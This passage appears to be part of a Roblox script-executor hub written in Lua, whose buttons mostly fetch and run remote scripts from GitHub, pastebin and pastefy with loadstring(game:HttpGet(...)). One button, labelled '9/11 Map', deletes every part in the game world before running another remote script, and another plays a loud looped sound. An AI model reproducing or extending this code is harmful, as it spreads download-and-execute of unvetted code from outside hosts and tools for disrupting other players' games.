        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function()

            Clear()

            i=0

            Search(S)

        end)

        i=i+1

    end

end



pgr.MouseButton1Click:connect(function()

    Clear()

    Search(game)

end)
end)
AddButton(SPage7, "FE Animation Pack", X2Y1, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Epik-R6-Dancezz-42246"))()
end)
AddButton(SPage7, "CHAOTIC", X3Y1)
AddButton(SPage7, "Plasma Shotgun", X4Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GRAVEBUSTER0/GRAVEBUSTER0/refs/heads/main/Plasma.lua"))()
end)
AddButton(SPage7, "Project E00KIDD", X1Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/Project-7L8-v3.5-completed/refs/heads/main/Project%207L8%20v3.5%20completed.%E2%98%91%EF%B8%8F"))()
end)
AddButton(SPage7, "Polaria but Bad", X2Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/c-1-23/c-1-23/refs/heads/main/POLARIA"))()
end)
AddButton(SPage7, "Green Sword Fighter", X3Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Neon%20Green%20Sword.txt"))()
end)
AddButton(SPage7, "Chernobly Nuclear Power Plant", X4Y2)
AddButton(SPage7, "Project LegDoMagma", X1Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LionArchelon/LionArch_Helon-Script-Pack/refs/heads/main/Project%20LegDoMagma.lua"))()
end)
AddButton(SPage7, "Play C00lkidd_1", X2Y3, function()
local Sound = Instance.new("Sound", game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://94795824357273"
Sound.Looped = true
Sound.PlaybackSpeed = 0.17
Sound.Volume = 10
Sound:Play()
Sound.Name = "c00l_1"
end)

AddButton(SPage7, "Private gui by Sigma_Rc7 (PositiveKey10)", X3Y3, function()
loadstring(game:HttpGet("https://pastebin.com/raw/4h5sqxgA"))()
end)
AddButton(SPage7, "Project Euphoria", X4Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TEST19983/Realrhejrj/refs/heads/main/Refjf"))()
end)
AddButton(SPage7, "Ac*rn gui", X1Y4, function()
loadstring(game:HttpGet("https://pastefy.app/ONNKneRS/raw"))()
end)
AddButton(SPage7, "9/11 Map", X2Y4, function()
	for i, v in pairs(workspace:GetDescendants()) do
		if v.Name ~= "Terrain" then
		if v:IsA("BasePart") then
			v:Destroy()
		end
		if v:IsA("Part") then
			v:Destroy()
		end
		end
	end
	wait(game.Players.RespawnTime)
	wait()
	loadstring(game:HttpGet("https://pastefy.app/hzh1w1Xs/raw"))()
end)